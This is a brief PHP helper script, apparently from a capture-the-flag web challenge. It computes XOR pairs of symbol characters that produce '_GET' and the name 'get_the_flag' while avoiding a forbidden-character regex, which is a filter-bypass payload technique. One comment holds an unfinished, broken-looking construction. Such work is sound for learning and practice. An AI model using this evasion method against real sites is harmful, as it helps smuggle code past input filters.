<?php
// 测试构造 _GET
// _ = $ ^ { = 36 ^ 123 = 95
// G = : ^ } = 58 ^ 125 = 71
// E = > ^ { = 62 ^ 123 = 69
// T = ) ^ } = 41 ^ 125 = 84

// 构造方式: ${$^{:}}^{$^{:}}^{:}^{:}}^{:}^{:}}^{:}^{:}}
// 太复杂，需要简化

// 另一种方法：利用可变变量
// ${$} 可以得到变量名

// 测试异或字符串
$a = '$' ^ '{';
$b = ':' ^ '}';
$c = '>' ^ '{';
$d = ')' ^ '}';
echo "Result: $a$b$c$d\n";  // 应该输出 _GET

// 构造 payload
// 我们需要调用 get_the_flag()
// 但函数名也包含字母

// 检查 get_the_flag 的字符
echo "\nFinding XOR for get_the_flag:\n";
$func = "get_the_flag";
$forbidden = "/[\x00- 0-9A-Za-z\'\"\`~_&.,|=[\x7F]+/i";

for($i = 0; $i < strlen($func); $i++) {
    $target = ord($func[$i]);
    echo $func[$i] . " ($target): ";
    for($j = 33; $j < 127; $j++) {
        $c1 = chr($j);
        if(preg_match($forbidden, $c1)) continue;
        for($k = 33; $k < 127; $k++) {
            $c2 = chr($k);
            if(preg_match($forbidden, $c2)) continue;
            if(($j ^ $k) == $target) {
                echo "chr($j)^chr($k) = '$c1'^'$c2'\n";
                break 2;
            }
        }
    }
}
?>
